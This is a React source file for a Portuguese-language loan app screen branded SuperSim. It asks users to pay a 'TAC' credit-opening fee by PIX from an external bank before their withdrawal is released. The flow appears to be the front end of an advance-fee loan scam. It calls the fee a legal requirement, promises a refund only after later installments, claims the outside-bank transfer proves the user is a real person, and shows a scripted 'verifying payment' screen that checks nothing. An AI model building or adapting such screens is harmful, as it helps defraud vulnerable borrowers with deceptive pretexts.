import { useEffect, useRef, useState } from 'react'
import {
  AlertCircle,
  Building2,
  Check,
  Clock,
  Copy,
  Loader2,
  RefreshCw,
  Scale,
  Shield,
} from 'lucide-react'
import {
  TAC_AMOUNT,
  TAC_BANK,
  TAC_PIX_KEY,
  TAC_REFUND_AFTER_INSTALLMENTS,
  TAC_RELEASE_MAX_HOURS,
  TAC_SINGLE_CHARGE_NOTICE,
} from '@/mocks/cartao-data'
import { useTacPixCode } from '@/hooks/useTacPixCode'
import { formatCurrency } from '@/lib/utils'
import { cn } from '@/lib/utils'

function PageHeader({ title, onBack }: { title: string; onBack: () => void }) {
  return (
    <div className="mb-4 flex items-center gap-3">
      <button type="button" onClick={onBack} className="text-sm font-semibold text-primary">
        Voltar
      </button>
      <h2 className="text-xl font-bold">{title}</h2>
    </div>
  )
}

function ConfirmRow({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <p className="text-text-light">{label}</p>
      <p className="whitespace-pre-line font-semibold text-text">{value}</p>
    </div>
  )
}

export function TacLegalNotice({ className }: { className?: string }) {
  return (
    <div
      className={cn(
        'flex items-start gap-3 rounded-xl border border-[#BBF7D0] bg-[#F0FDF4] px-4 py-3',
        className,
      )}
    >
      <Scale className="mt-0.5 size-5 shrink-0 text-green-700" />
      <div>
        <p className="text-xs font-bold text-green-800">Cobrança única — exigência legal</p>
        <p className="mt-1 text-xs leading-relaxed text-green-900/90">{TAC_SINGLE_CHARGE_NOTICE}</p>
      </div>
    </div>
  )
}

function ExternalBankNotice({ className }: { className?: string }) {
  return (
    <div
      className={cn(
        'flex items-start gap-3 rounded-xl border border-[#FDE68A] bg-[#FFFBEB] px-4 py-3',
        className,
      )}
    >
      <Building2 className="mt-0.5 size-5 shrink-0 text-primary" />
      <p className="text-xs leading-relaxed text-text-mid">
        A transferência da TAC deve ser feita a partir de{' '}
        <strong className="text-text">outro banco ou instituição financeira</strong> — use uma conta
        externa à SuperSim. Isso comprova a existência de uma pessoa real vinculada ao CPF.
      </p>
    </div>
  )
}

function PixCopiaColaField({
  copiaCola,
  loading,
  error,
  copied,
  onCopy,
  onReload,
}: {
  copiaCola: string
  loading: boolean
  error: string
  copied: boolean
  onCopy: () => void
  onReload: () => void
}) {
  const copyButtonRef = useRef<HTMLButtonElement>(null)

  useEffect(() => {
    if (loading || error || !copiaCola) return
    requestAnimationFrame(() => {
      copyButtonRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' })
    })
  }, [loading, error, copiaCola])

  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between">
        <p className="text-sm font-bold text-text">PIX Copia e Cola</p>
        {!loading && (
          <button
            type="button"
            onClick={onReload}
            className="flex items-center gap-1 text-xs font-semibold text-primary"
          >
            <RefreshCw className="size-3.5" />
            Gerar novo
          </button>
        )}
      </div>

      {loading ? (
        <div className="flex items-center justify-center gap-2 rounded-xl border border-border bg-[#F9FAFB] px-4 py-8 text-sm text-text-mid">
          <Loader2 className="size-5 animate-spin text-primary" />
          Gerando código PIX...
        </div>
      ) : error ? (
        <div className="space-y-3">
          <div className="flex items-start gap-2 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
            <AlertCircle className="mt-0.5 size-4 shrink-0" />
            {error}
          </div>
          <button
            type="button"
            onClick={onReload}
            className="w-full rounded-xl border border-border px-4 py-3 text-sm font-semibold text-text-mid"
          >
            Tentar novamente
          </button>
        </div>
      ) : (
        <>
          <div className="rounded-xl border border-border bg-[#F9FAFB] p-3">
            <p className="break-all font-mono text-[11px] leading-relaxed text-text-mid">{copiaCola}</p>
          </div>
          <button
            ref={copyButtonRef}
            type="button"
            onClick={onCopy}
            className={cn(
              'flex w-full scroll-mt-24 items-center justify-center gap-2 rounded-xl px-4 py-3.5 text-sm font-semibold transition-colors',
              copied
                ? 'bg-green-600 text-white'
                : 'bg-[#1F2937] text-white active:bg-[#111827]',
            )}
          >
            {copied ? (
              <>
                <Check className="size-4" />
                Código copiado!
              </>
            ) : (
              <>
                <Copy className="size-4" />
                Copiar código PIX
              </>
            )}
          </button>
          <p className="text-center text-[11px] text-text-light">
            Abra o app do seu banco, escolha PIX Copia e Cola e cole o código.
          </p>
        </>
      )}
    </div>
  )
}

export function TacForm({ onConfirm, onBack }: { onConfirm: () => void; onBack: () => void }) {
  const { copiaCola, loading, error, copied, copy, reload } = useTacPixCode(TAC_AMOUNT)

  return (
    <div>
      <PageHeader title="TAC — Abertura de Crédito" onBack={onBack} />
      <div className="space-y-4">
        <TacLegalNotice />
        <ExternalBankNotice />

        <div className="rounded-2xl border border-border bg-white p-5 shadow-sm">
          <div className="mb-4 flex items-start gap-3">
            <Shield className="mt-0.5 size-5 shrink-0 text-primary" />
            <div>
              <p className="text-sm font-bold text-text">Taxa de Abertura de Crédito</p>
              <p className="mt-1 text-sm text-text-mid">
                Efetue a transferência PIX de {formatCurrency(TAC_AMOUNT)} para concluir seu saque.
              </p>
            </div>
          </div>

          <p className="mb-1 text-sm text-text-light">Valor da TAC</p>
          <p className="mb-3 text-3xl font-extrabold text-primary-dark">{formatCurrency(TAC_AMOUNT)}</p>

          <p className="mb-5 rounded-xl bg-[#EFF6FF] px-4 py-3 text-xs text-text-mid">
            O valor da TAC pode ser solicitado para reembolso após o pagamento da{' '}
            {TAC_REFUND_AFTER_INSTALLMENTS}ª parcela do empréstimo.
          </p>

          <div className="mb-5 space-y-2 rounded-xl bg-[#F9FAFB] p-4 text-sm">
            <div>
              <span className="text-text-light">Beneficiário</span>
              <p className="font-semibold">{TAC_BANK}</p>
            </div>
            <div>
              <span className="text-text-light">Chave PIX (CNPJ)</span>
              <p className="font-semibold">{TAC_PIX_KEY}</p>
            </div>
          </div>

          <PixCopiaColaField
            copiaCola={copiaCola}
            loading={loading}
            error={error}
            copied={copied}
            onCopy={copy}
            onReload={reload}
          />

          <button
            type="button"
            onClick={onConfirm}
            disabled={loading || !!error || !copiaCola}
            className="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-4 text-base font-semibold text-white disabled:cursor-not-allowed disabled:opacity-50"
          >
            Já transferi de outro banco
          </button>
        </div>
      </div>
    </div>
  )
}

export function TacConfirm({
  onConfirm,
  onEdit,
  onBack,
}: {
  onConfirm: () => void
  onEdit: () => void
  onBack: () => void
}) {
  return (
    <div>
      <PageHeader title="Confirmar TAC" onBack={onBack} />
      <div className="space-y-4">
        <TacLegalNotice />
        <ExternalBankNotice />

        <div className="rounded-2xl border border-border bg-white p-5 shadow-sm">
          <p className="mb-4 text-sm text-text-mid">
            Confirme que você transferiu {formatCurrency(TAC_AMOUNT)} via PIX Copia e Cola usando uma
            conta de <strong>outro banco ou instituição financeira</strong>. Após confirmar, aguarde
            a liberação do TAC por até {TAC_RELEASE_MAX_HOURS} horas. O reembolso pode ser solicitado
            após a {TAC_REFUND_AFTER_INSTALLMENTS}ª parcela paga.
          </p>
          <div className="mb-6 space-y-3 text-sm">
            <ConfirmRow label="Valor" value={formatCurrency(TAC_AMOUNT)} />
            <ConfirmRow label="Para" value={`${TAC_BANK}\nCNPJ ${TAC_PIX_KEY}`} />
            <ConfirmRow label="Tipo" value="PIX Copia e Cola (conta externa)" />
            <ConfirmRow label="Origem exigida" value="Outro banco ou instituição financeira" />
          </div>
          <button
            type="button"
            onClick={onConfirm}
            className="mb-3 w-full rounded-xl bg-primary px-4 py-4 text-base font-semibold text-white"
          >
            Confirmar transferência e aguardar liberação
          </button>
          <button
            type="button"
            onClick={onEdit}
            className="w-full rounded-xl border border-border px-4 py-3 text-sm font-semibold text-text-mid"
          >
            Voltar ao código PIX
          </button>
        </div>
      </div>
    </div>
  )
}

export function TacWaiting({
  submittedAt,
  onHome,
}: {
  submittedAt: string
  onHome: () => void
}) {
  const [checking, setChecking] = useState(false)

  const submittedLabel = new Date(submittedAt).toLocaleString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
  })

  return (
    <div className="space-y-4">
      <TacLegalNotice />
      <div className="flex flex-col items-center py-4 text-center">
        <div className="mb-5 flex size-20 items-center justify-center rounded-full bg-primary-subtle text-primary">
          <Clock className="size-10 animate-pulse" />
        </div>
        <h2 className="mb-2 text-xl font-bold text-text">Aguardando liberação do TAC</h2>
        <p className="mb-1 text-sm text-text-mid">
          Sua transferência foi registrada em {submittedLabel}.
        </p>
        <p className="mb-6 max-w-xs text-sm font-semibold text-primary-dark">
          A confirmação pode levar até {TAC_RELEASE_MAX_HOURS} horas.
        </p>

        <div className="mb-6 w-full rounded-2xl border border-border bg-white p-5 text-left shadow-sm">
          <div className="mb-3 flex items-center gap-2">
            <Loader2 className="size-5 animate-spin text-primary" />
            <p className="text-sm font-semibold text-text">Verificando pagamento...</p>
          </div>
          <ul className="space-y-2 text-xs text-text-mid">
            <li>• Conferindo transferência de conta externa</li>
            <li>• Validando comprovante PIX Copia e Cola</li>
            <li>• Liberando TAC para concluir o saque</li>
          </ul>
        </div>

        <p className="mb-6 text-xs text-text-light">
          Você receberá a confirmação assim que o pagamento for validado. Não é necessário
          permanecer nesta tela.
        </p>

        <button
          type="button"
          disabled={checking}
          onClick={() => {
            setChecking(true)
            onHome()
          }}
          className="w-full max-w-xs rounded-xl border border-border px-4 py-3 text-sm font-semibold text-text-mid"
        >
          Voltar ao início
        </button>
      </div>
    </div>
  )
}
